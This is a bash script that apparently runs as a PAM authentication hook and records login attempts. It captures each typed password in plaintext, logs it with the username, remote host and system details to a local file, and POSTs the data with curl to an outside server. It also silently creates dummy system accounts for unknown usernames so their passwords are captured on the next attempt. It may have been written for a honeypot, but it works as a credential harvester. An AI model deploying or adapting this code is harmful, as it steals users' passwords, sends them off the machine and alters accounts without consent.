#!/bin/bash

read password

hexval=$(xxd -pu <<< "$password")

# PAM blanks out passwords for accounts that don't exist (to stop password leaks) so create a dummy account with that username so next time the password is captured the next time that userid is tried
if [[ $hexval == "080a" ]]; then

`useradd -M -s /bin/false $PAM_USER`

else 

URL="https://skad.dog/attempt.php"
DATE=`date "+%Y%m%d"`
TIME_STAMP=`date "+%Y%m%d-%H%M%S"`
UNAME=`uname -a`
# The key should be stored in a local file
KEY=`cat /sys/class/net/eth0/address`

read -r -d '' JSON << EOM
{
	"timestamp": "$TIME_STAMP",
	"user": "$PAM_USER",
	"password": "$password",
	"ruser": "$PAM_RUSER",
	"rhost": "$PAM_RHOST",
	"service": "$PAM_SERVICE",
	"TTY": "$PAM_TTY",
	"uname": "$UNAME",
	"key": "$KEY"
}
EOM

LOG_ENTRY="$TIME_STAMP, $PAM_USER, $password, $PAM_RUSER, $PAM_RHOST, $PAM_SERVICE, $PAM_TTY, $UNAME"

echo "$LOG_ENTRY" >> /var/log/skad_dog.log

JSON_FILE="/tmp/json.$TIME_STAMP.$RANDOM"
echo "$JSON" > $JSON_FILE
CMD="curl -i -X POST -d @$JSON_FILE $URL"
`$CMD` &> /dev/null
`rm $JSON_FILE`

fi
